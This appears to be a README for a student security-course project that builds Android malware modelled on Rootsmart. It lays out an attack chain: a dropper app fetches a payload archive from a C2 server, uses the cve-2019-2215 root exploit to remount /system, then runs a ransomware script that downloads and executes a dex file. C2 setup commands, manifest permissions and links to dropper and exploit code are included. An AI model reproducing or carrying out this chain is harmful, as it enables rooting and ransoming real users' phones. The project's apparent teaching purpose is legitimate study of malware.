# ICT2207 - Rootsmart 2.0 w/ cve-2019-2215 + Ransomware

Attack Vector:

References:
- [Rootsmart analysis A](https://forensics.spreitzenbarth.de/2012/02/12/detailed-analysis-of-android-bmaster/)
- [Rootsmart analysis B](https://resources.infosecinstitute.com/topic/rootsmart-android-malware/)
- [Rootsmart analysis C](https://www.csc2.ncsu.edu/faculty/xjiang4/RootSmart/)
- [Git - Dropper PoC](https://github.com/agentzex/The-Nice-Dropper)
- [Git - cve-2019-2215](https://github.com/kangtastic/cve-2019-2215)
- [Accessing Resources](https://mkyong.com/java/java-read-a-file-from-resources-folder/)
- [Creating Assets Folder](https://stackoverflow.com/questions/18302603/where-to-place-the-assets-folder-in-android-studio)
- [Run binary in asset folder A](https://stackoverflow.com/questions/5583487/hosting-an-executable-within-android-application)
- [Run binary in asset folder B](http://gimite.net/en/index.php?Run%20native%20executable%20in%20Android%20App)
- [Building jar via Gradle](https://linuxtut.com/en/0553b36f765548160bb3/)

1. Install Malware
2. Run malware
3. Download shells.zip from C2 and unzip to /data/data/com.google.android.\<app package name\>/files
	- cve-2019-2215 binary
	- install.sh
	- ransomware.sh
4. chmod 775 cve-2019-2215 (our root shell binary)
5. exec install.sh to use cve-2019-2215 root shell and remount /system and then create other needed dir in filesystem
6. exec ransomeware.sh which will download dex file and execute dex file via dalvikvm command [ref](https://gist.github.com/lifuzu/9918513)

---

## Set up C2 server
For this test, ensure that the victim phone and the C2 server are in the same subnet (otherwise host C2 in public internet).

Compressing CVE:
```bash
tar -czvf shells.tar.gz cve-2019-2215
```

Dropper Server
```bash
# Better to run flask on Windows if WSL don't port forward localhost traffic to Windows Host

cd dropper
python3 -m venv venv
. venv/bin/activate # Linux
venv\Scripts\activate.bat # Windows
pip install -r requirements.txt --upgrade pip # Make sure host shell is root/Administrator
python3 dropper_server.py # WSL
python dropper_server.py # Windows
```

---
## Android App
- AndroidManifest.xml
```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.WRITE_INTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>

<application 
	android:requestLegacyExternalStorage="true"
    android:usesCleartextTraffic="true" >
```